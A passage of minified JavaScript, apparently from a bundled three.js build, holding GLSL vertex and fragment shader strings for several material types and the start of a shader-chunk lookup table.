	#include <project_vertex>
}`,bu=`uniform sampler2D tEquirect;
varying vec3 vWorldDirection;
#include <common>
void main() {
	vec3 direction = normalize( vWorldDirection );
	vec2 sampleUV = equirectUv( direction );
	gl_FragColor = texture2D( tEquirect, sampleUV );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,Tu=`uniform float scale;
attribute float lineDistance;
varying float vLineDistance;
#include <common>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	vLineDistance = scale * lineDistance;
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,Au=`uniform vec3 diffuse;
uniform float opacity;
uniform float dashSize;
uniform float totalSize;
varying float vLineDistance;
#include <common>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	if ( mod( vLineDistance, totalSize ) > dashSize ) {
		discard;
	}
	vec3 outgoingLight = vec3( 0.0 );
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,Ru=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#if defined ( USE_ENVMAP ) || defined ( USE_SKINNING )
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinbase_vertex>
		#include <skinnormal_vertex>
		#include <defaultnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <fog_vertex>
}`,wu=`uniform vec3 diffuse;
uniform float opacity;
#ifndef FLAT_SHADED
	varying vec3 vNormal;
#endif
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		reflectedLight.indirectDiffuse += lightMapTexel.rgb * lightMapIntensity * RECIPROCAL_PI;
	#else
		reflectedLight.indirectDiffuse += vec3( 1.0 );
	#endif
	#include <aomap_fragment>
	reflectedLight.indirectDiffuse *= diffuseColor.rgb;
	vec3 outgoingLight = reflectedLight.indirectDiffuse;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Cu=`#define LAMBERT
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,Pu=`#define LAMBERT
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <packing>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_lambert_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_lambert_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Iu=`#define MATCAP
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <displacementmap_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
	vViewPosition = - mvPosition.xyz;
}`,Lu=`#define MATCAP
uniform vec3 diffuse;
uniform float opacity;
uniform sampler2D matcap;
varying vec3 vViewPosition;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	vec3 viewDir = normalize( vViewPosition );
	vec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );
	vec3 y = cross( viewDir, x );
	vec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5;
	#ifdef USE_MATCAP
		vec4 matcapColor = texture2D( matcap, uv );
	#else
		vec4 matcapColor = vec4( vec3( mix( 0.2, 0.8, uv.y ) ), 1.0 );
	#endif
	vec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Du=`#define NORMAL
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	varying vec3 vViewPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	vViewPosition = - mvPosition.xyz;
#endif
}`,Nu=`#define NORMAL
uniform float opacity;
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	varying vec3 vViewPosition;
#endif
#include <packing>
#include <uv_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	gl_FragColor = vec4( packNormalToRGB( normal ), opacity );
	#ifdef OPAQUE
		gl_FragColor.a = 1.0;
	#endif
}`,Uu=`#define PHONG
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,Ou=`#define PHONG
uniform vec3 diffuse;
uniform vec3 emissive;
uniform vec3 specular;
uniform float shininess;
uniform float opacity;
#include <common>
#include <packing>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_phong_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_phong_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Fu=`#define STANDARD
varying vec3 vViewPosition;
#ifdef USE_TRANSMISSION
	varying vec3 vWorldPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
#ifdef USE_TRANSMISSION
	vWorldPosition = worldPosition.xyz;
#endif
}`,ku=`#define STANDARD
#ifdef PHYSICAL
	#define IOR
	#define USE_SPECULAR
#endif
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float roughness;
uniform float metalness;
uniform float opacity;
#ifdef IOR
	uniform float ior;
#endif
#ifdef USE_SPECULAR
	uniform float specularIntensity;
	uniform vec3 specularColor;
	#ifdef USE_SPECULAR_COLORMAP
		uniform sampler2D specularColorMap;
	#endif
	#ifdef USE_SPECULAR_INTENSITYMAP
		uniform sampler2D specularIntensityMap;
	#endif
#endif
#ifdef USE_CLEARCOAT
	uniform float clearcoat;
	uniform float clearcoatRoughness;
#endif
#ifdef USE_IRIDESCENCE
	uniform float iridescence;
	uniform float iridescenceIOR;
	uniform float iridescenceThicknessMinimum;
	uniform float iridescenceThicknessMaximum;
#endif
#ifdef USE_SHEEN
	uniform vec3 sheenColor;
	uniform float sheenRoughness;
	#ifdef USE_SHEEN_COLORMAP
		uniform sampler2D sheenColorMap;
	#endif
	#ifdef USE_SHEEN_ROUGHNESSMAP
		uniform sampler2D sheenRoughnessMap;
	#endif
#endif
#ifdef USE_ANISOTROPY
	uniform vec2 anisotropyVector;
	#ifdef USE_ANISOTROPYMAP
		uniform sampler2D anisotropyMap;
	#endif
#endif
varying vec3 vViewPosition;
#include <common>
#include <packing>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <iridescence_fragment>
#include <cube_uv_reflection_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_physical_pars_fragment>
#include <fog_pars_fragment>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_physical_pars_fragment>
#include <transmission_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <clearcoat_pars_fragment>
#include <iridescence_pars_fragment>
#include <roughnessmap_pars_fragment>
#include <metalnessmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <roughnessmap_fragment>
	#include <metalnessmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <clearcoat_normal_fragment_begin>
	#include <clearcoat_normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_physical_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 totalDiffuse = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse;
	vec3 totalSpecular = reflectedLight.directSpecular + reflectedLight.indirectSpecular;
	#include <transmission_fragment>
	vec3 outgoingLight = totalDiffuse + totalSpecular + totalEmissiveRadiance;
	#ifdef USE_SHEEN
		float sheenEnergyComp = 1.0 - 0.157 * max3( material.sheenColor );
		outgoingLight = outgoingLight * sheenEnergyComp + sheenSpecularDirect + sheenSpecularIndirect;
	#endif
	#ifdef USE_CLEARCOAT
		float dotNVcc = saturate( dot( geometryClearcoatNormal, geometryViewDir ) );
		vec3 Fcc = F_Schlick( material.clearcoatF0, material.clearcoatF90, dotNVcc );
		outgoingLight = outgoingLight * ( 1.0 - material.clearcoat * Fcc ) + ( clearcoatSpecularDirect + clearcoatSpecularIndirect ) * material.clearcoat;
	#endif
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Bu=`#define TOON
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,zu=`#define TOON
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <packing>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <gradientmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_toon_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec4 diffuseColor = vec4( diffuse, opacity );
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_toon_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,Gu=`uniform float size;
uniform float scale;
#include <common>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
#ifdef USE_POINTS_UV
	varying vec2 vUv;
	uniform mat3 uvTransform;
#endif
void main() {
	#ifdef USE_POINTS_UV
		vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	#endif
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	gl_PointSize = size;
	#ifdef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );
	#endif
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <fog_vertex>
}`,Hu=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <color_pars_fragment>
#include <map_particle_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <logdepthbuf_fragment>
	#include <map_particle_fragment>
	#include <color_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,Vu=`#include <common>
#include <batching_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <shadowmap_pars_vertex>
void main() {
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,Wu=`uniform vec3 color;
uniform float opacity;
#include <common>
#include <packing>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <logdepthbuf_pars_fragment>
#include <shadowmap_pars_fragment>
#include <shadowmask_pars_fragment>
void main() {
	#include <logdepthbuf_fragment>
	gl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
}`,Xu=`uniform float rotation;
uniform vec2 center;
#include <common>
#include <uv_pars_vertex>
#include <fog_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	vec4 mvPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );
	vec2 scale;
	scale.x = length( vec3( modelMatrix[ 0 ].x, modelMatrix[ 0 ].y, modelMatrix[ 0 ].z ) );
	scale.y = length( vec3( modelMatrix[ 1 ].x, modelMatrix[ 1 ].y, modelMatrix[ 1 ].z ) );
	#ifndef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) scale *= - mvPosition.z;
	#endif
	vec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;
	vec2 rotatedPosition;
	rotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;
	rotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;
	mvPosition.xy += rotatedPosition;
	gl_Position = projectionMatrix * mvPosition;
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,qu=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
}`,It={alphahash_fragment:hc,alphahash_pars_fragment:mc,alphamap_fragment:_c,alphamap_pars_fragment:gc,alphatest_fragment:vc,alphatest_pars_fragment:xc,aomap_fragment:Ec,aomap_pars_fragment:yc,batching_pars_vertex:Mc,batching_vertex:Sc,begin_vertex:bc,beginnormal_vertex:Tc,bsdfs:Ac,iridescence_fragment:Rc,bumpmap_pars_fragment:wc,clipping_planes_fragment:Cc,clipping_planes_pars_fragment:Pc,clipping_planes_pars_vertex:Ic,clipping_planes_vertex:Lc,color_fragment:Dc,color_pars_fragment:Nc,color_pars_vertex:Uc,color_vertex:Oc,common:Fc,cube_uv_reflection_fragment:kc,defaultnormal_vertex:Bc,displacementmap_pars_vertex:zc,displacementmap_vertex:Gc,emissivemap_fragment:Hc,emissivemap_pars_fragment:Vc,colorspace_fragment:Wc,colorspace_pars_fragment:Xc,envmap_fragment:qc,envmap_common_pars_fragment:Yc,envmap_pars_fragment:jc,envmap_pars_vertex:$c,envmap_physical_pars_fragment:od,envmap_vertex:Kc,fog_vertex:Zc,fog_pars_vertex:Jc,fog_fragment:Qc,fog_pars_fragment:td,gradientmap_pars_fragment:ed,lightmap_fragment:nd,lightmap_pars_fragment:id,lights_lambert_fragment:rd,lights_lambert_pars_fragment:sd,lights_pars_begin:ad,lights_toon_fragment:ld,lights_toon_pars_fragment:cd,lights_phong_fragment:dd,lights_phong_pars_fragment:ud,lights_physical_fragment:pd,lights_physical_pars_fragment:fd,lights_fragment_begin:hd,lights_fragment_maps:md,lights_fragment_end:_d,logdepthbuf_fragment:gd,logdepthbuf_pars_fragment:vd,logdepthbuf_pars_vertex:xd,logdepthbuf_vertex:Ed,map_fragment:yd,map_pars_fragment:Md,map_particle_fragment:Sd,map_particle_pars_fragment:bd,metalnessmap_fragment:Td,metalnessmap_pars_fragment:Ad,morphcolor_vertex:Rd,morphnormal_vertex:wd,morphtarget_pars_vertex:Cd,morphtarget_vertex:Pd,normal_fragment_begin:Id,normal_fragment_maps:Ld,normal_pars_fragment:Dd,normal_pars_vertex:Nd,normal_vertex:Ud,normalmap_pars_fragment:Od,clearcoat_normal_fragment_begin:Fd,clearcoat_normal_fragment_maps:kd,clearcoat_pars_fragment:Bd,iridescence_pars_fragment:zd,opaque_fragment:Gd,packing:Hd,premultiplied_alpha_fragment:Vd,project_vertex:Wd,dithering_fragment:Xd,dithering_pars_fragment:qd,roughnessmap_fragment:Yd,roughnessmap_pars_fragment:jd,shadowmap_pars_fragment:$d,shadowmap_pars_vertex:Kd,shadowmap_vertex:Zd,shadowmask_pars_fragment:Jd,skinbase_vertex:Qd,skinning_pars_vertex:tu,skinning_vertex:eu,skinnormal_vertex:nu,specularmap_fragment:iu,specularmap_pars_fragment:ru,tonemapping_fragment:su,tonemapping_pars_fragment:au,transmission_fragment:ou,transmission_pars_fragment:lu,uv_pars_fragment:cu,uv_pars_vertex:du,uv_vertex:uu,worldpos_vertex:pu,background_vert:fu,background_frag:hu,backgroun